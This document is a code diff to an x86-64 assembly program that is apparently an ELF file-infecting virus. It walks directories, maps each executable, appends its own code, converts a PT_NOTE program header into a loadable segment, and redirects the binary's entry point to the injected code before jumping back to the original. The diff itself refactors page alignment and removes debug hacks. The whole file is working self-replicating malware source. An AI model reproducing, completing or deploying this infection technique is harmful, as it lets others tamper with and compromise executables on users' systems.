@@ -24,6 +24,9 @@
 ; 64 bytes header + 56 bytes for one program header + 1000 bytes for a load segment
 %define MINIMAL_FILE_SIZE 64 + 56 + 1000
 
+%define PAGE_SIZE 		0x1000
+%define OFFSET_FROM_PAGE_MASK 	0xFFF
+
 global _start
 
 struc linux_dirent64
@@ -88,10 +91,12 @@ endstruc
 
 section .text
 
+; TODO Fork to return faster to original code?
 _start:
 	nop
 	; WTF ça bug si on lance avec lldb https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
-my_code:
+	; TODO See if something is possible ?
+begin:
 	; save all registers
 	push rax
 	push rdi
@@ -243,7 +248,7 @@ treat_file:
 	%local mappedfile:qword				; void *mappedfile;
 	%local exec_segment:qword			; struct elf64_phdr *exec_segment;
 	%local payload_offset:qword			; long payload_offset;
-	%local next_available_vaddr:qword		; Elf64_addr next_available_vaddr;
+	%local new_vaddr:qword				; Elf64_addr new_vaddr;
 	%local payload_size:qword			; long payload_size;
 	%local offset_to_sub_mmap:qword			; long offset_to_sub_mmap;
 	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
@@ -263,7 +268,7 @@ treat_file:
 	lea rdi, [pathbuf]				; dest = pathbuf;
 	mov rsi, [dirname]				; src = dirname;
 	.dirname: ; TODO : Do something with repnz instead of these 3 lines?
-		add r8, 1				; len++;
+		inc r8					; len++;
 		cmp r8, PATH_MAX			; if (len == PATH_MAX)
 		je .err					; 	goto .err;
 		movsb					; *dest++ = *src++;
@@ -272,7 +277,7 @@ treat_file:
 
 	mov rsi, [filename]				; src = filename;
 	.filename:
-		add r8, 1				; len++;
+		inc r8					; len++;
 		cmp r8, PATH_MAX			; if (len == PATH_MAX)
 		je .err					; 	goto .err;
 		movsb					; *dest++ = *src++;
@@ -313,7 +318,6 @@ treat_file:
 	mov rdi, 0					; 	0,
 	mov rsi, [filesize]				; 	filesize + (_end - _start),
 	add rsi, _end - _start				;	...
-	add rsi, 0xFFFFFF	; TODO DEBUG JUST FOR TESTING BIG BIG VALUE OH YEAH (E_NOMEM ON MMAP BELOW)
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
 	mov r8, -1					; 	-1,
@@ -365,40 +369,30 @@ treat_file:
 ;	mov rsi, [exec_segment]				; ...
 ;	call inject					; ...
 
-	; TODO REmove comment we are doing payload_offset
 	mov rax, [filesize]				; payload_offset = filesize;
 	mov [payload_offset], rax			; ...
 
-	mov rdi, [mappedfile]
-	call get_next_available_vaddr
+	mov rdi, [mappedfile]				; _new_vaddr = get_next_available_vaddr(mappedfile);
+	call get_next_available_vaddr			; ...
 	; TODO Check error
 
-	; Align next_available_vaddr to next pagesize
-	mov rdi, [filesize]			; Move address of payload in file in rdi
-	and rdi, 0xFFF				; Get last 24 bits of this address
-	mov rsi, rax				; Move address of next_available_vaddr in rsi
-	and rsi, 0xFFFFFFFFFFFFF000		; Remove last 24 bits of this address
-	add rsi, rdi				; Replace these bits by the last 24 bits of address payload
-	mov rdi, rax				; Get next_available_vaddr in rdi
-	xor r8, r8				; Set r8 to 0
-	mov r9, 0x1000				; Move 0x1000 to r9
-	cmp rdi, rsi				; If next_available_vaddr > calculated_address
-	cmova r8, r9				; Add 0x1000 to address
-	add rsi, r8				; ...
-	mov [next_available_vaddr], rsi		; Put the address in next_available_vaddr
+	; Align new_vaddr to offset in file such as offset = vaddr % PAGE_SIZE
+	mov rdi, [payload_offset]			; _offset_from_page = payload_offset;
+	and rdi, OFFSET_FROM_PAGE_MASK			; _offset_from_page &= OFFSET_FROM_PAGE_MASK
+	add rax, rdi					; _injected_segment_start += _offset_from_page;
+	mov [new_vaddr], rax				; new_vaddr = _new_vaddr;
 
-	mov rdi, _end - _start
-	mov [payload_size], rdi
+	mov rdi, _end - begin				; payload_size = _end - begin;
+	mov [payload_size], rdi				; ...
 
 	; TODO: If codecave can't contains payload
 	;	try PT_NOTE method
 	; TODO Check if PT_NOTE method available
 
 	; TODO rcx peut être différent de r8 si on fait de la compression
-	; TODO Fill args
 	mov rdi, [mappedfile]				; convert_pt_note_to_load(mappedfile,
 	mov rsi, [payload_offset]			; payload_offset,
-	mov rdx, [next_available_vaddr]			; next_available_vaddr,
+	mov rdx, [new_vaddr]				; next_vaddr,
 	mov rcx, [payload_size]				; payload_size,
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
@@ -407,14 +401,16 @@ treat_file:
 	mov rdi, [fd]					; fd,
 	mov rsi, [filesize]				; filesize
 	add rsi, [payload_size]				; + payload_size
-	add rsi, 0x1000		; TEMP TODO REMOVE THIS SHIT
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
+	; TODO Replace with an other name ? It is not an unamp err but we will do the same things
 	jl .unmap_err					;	goto .unmap_err
 
+	; Get address of the start of the current page
+	; TODO Do something about old_filesize but we use [filesize]
 	xor rdx, rdx					; _offset = old_filesize / page_size
 	mov rax, [filesize]				; ...
-	mov rdi, 0x1000
+	mov rdi, PAGE_SIZE				; ...
 	div rdi						; ...
 	mul rdi						; _offset *= page_size;
 	mov [offset_to_sub_mmap], rax			; offset_to_sub_mmap = _offset;
@@ -426,7 +422,6 @@ treat_file:
 	mov rsi, [filesize]				; 	filesize
 	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
 	add rsi, [payload_size]				;	  + payload_size
-	add rsi, 0x1000	; TODO REMOVE THIS SHIT
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
 	mov r8, [fd]					; 	fd,
@@ -436,54 +431,36 @@ treat_file:
 	; TODO Check mmap
 
 	; copy all bytes between _start and _end to the segment
-.cmacopie:
-	; TEMP TO MOVE
-;	xor rax, rax
-;	xor rax, rax
 	mov rdi, [mappedfile]				; dest = file_map + filesize;
 	add rdi, [filesize]				; ...
-	lea rsi, [rel my_code]				; src = _start; ; TODO WTF Need to do this
-;	mov r8, 0
-;	mov r8b, [rsi]
-;	mov r8b, [rsi+1]
-;	add rsi, 1 ; TEMP REMOVE
-	mov rcx, _end - _start				; len = _end - _start;
-;	sub rsp, 16
-;	mov byte [rsp+8], '5'
-;	mov byte [rsp+9], 'A'
-;	lea rsi, [rsp + 8]
-;	mov rdi, rsp
-;	movsb ; TEMP TODO REMOVE AND UNCOMMENT AFTER
-;	movsb ; TEMP TODO REMOVE AND UNCOMMENT AFTER
-;	add rsp, 16
+	lea rsi, [rel begin]				; src = begin; //TODO Fuck lldb
+	mov rcx, _end - begin				; len = _end - begin;
 	rep movsb					; memcpy(dest, src, len);
 
 	; compute jmp_value
-							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
-	mov rdi, [mappedfile]				; _old_entry = file_map
+	mov rdi, [mappedfile]				; _jmp_value = file_map
 	add rdi, elf64_hdr.e_entry			; 	->e_entry;
-	mov eax, [rdi]					; ... ; TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
+	mov eax, [rdi]					; ... // TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
 
-	; J'ai ptêt fait n'importe dans l'autre inject, j'ai modifié pour que ce soit edi mais en fait c'est bien rdi
-	; _computed_jmp_value ; TODO Comments
-	mov rdi, [next_available_vaddr]	; TODO Just for debug to see the value. Delete line
-	sub eax, [next_available_vaddr]			; ... TODO This is new_entry, precise better pls
-	sub eax, _jmp_instr - my_code			; ... ; TODO Do something my_code / _start
-	sub eax, 5					; ...
+	; TODO J'ai ptêt fait n'importe dans l'autre inject, j'ai modifié pour que ce soit edi mais en fait c'est bien rdi
+	; TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
+	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;	//TODO Precise that new_vaddr = new_entry?
+	sub eax, _jmp_instr - begin			; _jmp_value -= _jmp_instr - begin;
+	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction
 
 	; change jmp_value in injected code
-	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + new_entry + (_end - _start) - 8 (8 is the size of the jmp_value variable);
-	add rdi, [filesize]				; ...
-	add rdi, _jmp_instr - my_code			; ...
-	inc rdi						; ...
-	mov [rdi], eax					; *jmp_value_ptr = _computed_jmp_value;
+	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + filesize + (_end - _start) - 8 (8 is the size of the jmp_value variable);
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, _jmp_instr - begin			; 	+ (_jmp_inst - begin)
+	inc rdi						; 	+ 1;
+	mov [rdi], eax					; *jmp_value_ptr = _jmp_value;
 
 	; TODO Clean
-	; It sets the new entry. It was above before. But need to put this here
-	mov rdi, [mappedfile]
-	add rdi, elf64_hdr.e_entry
-	mov rax, [next_available_vaddr]
-	mov [rdi], rax
+	; TODO It sets the new entry. It was above before. But need to put this here
+	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
+	add rdi, elf64_hdr.e_entry			; ...
+	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
+	mov [rdi], rax					; ...
 
 	
 	; TODO: check codecave can contain signature
@@ -565,7 +542,7 @@ get_next_available_vaddr:
 	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr->e_phnum;
 	mov [e_phnum], ax				; ...
 
-	mov QWORD [furthest_segment_end], 0
+	mov QWORD [furthest_segment_end], 0		; furthest_segement_end = 0;
 
 	; loop through program headers
 	mov rsi, 0					; i = 0;
@@ -593,12 +570,21 @@ get_next_available_vaddr:
 		cmp si, [e_phnum]			; } while (i != e_phnum);
 		jne .begin_phdr_loop			; ...
 
-	mov rax, [furthest_segment_end]
-	mov rax, 0xc000000
+	; Round up to next multiple of PAGE_SIZE
+	mov rax, [furthest_segment_end]			; _next_available_vaddr = furthest_segment_end;
+	xor r8, r8					; _offset_to_align = 0
+	mov r9, PAGE_SIZE				; _new_offset_to_align = PAGE_SIZE
+	test rax, OFFSET_FROM_PAGE_MASK			; if (_furthest_segment_end & OFFSET_FROM_PAGE_MASK == 0)
+	cmovnz r8, r9					;	_offset_to_align = _new_offset_to_align
+	mov r9, OFFSET_FROM_PAGE_MASK			; _alignment_mask = OFFSET_FROM_PAGE_MASK
+	not r9						; _alignment_mask = ~alignement_mask;
+	and rax, r9					; _next_available_vaddr &= _alignement_mask;
+	add rax, r8					; _next_available_vaddr += _new_offset_to_align;
+
 	add rsp, %$localsize
 	pop rbp
 	%pop
-	ret
+	ret						; return _next_available_vaddr;
 	
 
 ; int is_elf_64(char const *file_map);
@@ -678,7 +664,7 @@ find_exec_segment:
 		jmp .found				; goto found;
 
 	.next_phdr_loop:
-		add rsi, 1				; i++;
+		inc rsi					; i++;
 		cmp rsi, [e_phnum]			; if (i == e_phnum)
 		je .not_found				; 	goto not_found;
 		jmp .begin_phdr_loop			; }
@@ -737,16 +723,16 @@ find_note_segment:
 		mov [res_header], rax			; res_header = cur_phdr;
 
 		; check if PT_NOTE
-		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_LOAD)
+		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_NOTE)
 		add rdi, elf64_phdr.p_type		; ...
 		mov eax, [rdi]				; ...
-		cmp eax, PT_NOTE			; ...;
+		cmp eax, PT_NOTE			; ...
 		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
 
 	.next_phdr_loop:
-		add rsi, 1				; i++;
+		inc rsi					; i++;
 		cmp rsi, [e_phnum]			; if (i == e_phnum)
 		je .not_found				; 	goto not_found;
 		jmp .begin_phdr_loop			; }
@@ -763,7 +749,7 @@ find_note_segment:
 	add rsp, %$localsize
 	pop rbp
 	%pop
-	ret
+	ret						; return res;
 
 ; int has_signature(char const *file_map, elf64_phdr *exec_segment)
 ; rax has_signature(rdi file_map, rsi exec_segment);
@@ -877,6 +863,7 @@ inject:
 
 	; compute jmp_value
 							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
+	; TODO "C'est assez petit yolo on s'en fout mais old_entry et new_entry sont en 64bits"
 	mov edi, [old_entry]				; computed_jmp_value = old_entry - (new_entry + code_length_to_jmp);
 	sub edi, [new_entry]				; ...
 	sub edi, _jmp_instr - _start			; ...
@@ -992,7 +979,7 @@ convert_pt_note_to_load:
 
 	mov rdi, rax					; _align_ptr = _note_segment->p_align;
 	add rdi, elf64_phdr.p_align			; ...
-	mov QWORD [rdi], 0x1000				; *_align_ptr = 0x1000;
+	mov QWORD [rdi], PAGE_SIZE			; *_align_ptr = PAGE_SIZE;
 
 	jmp .success
 
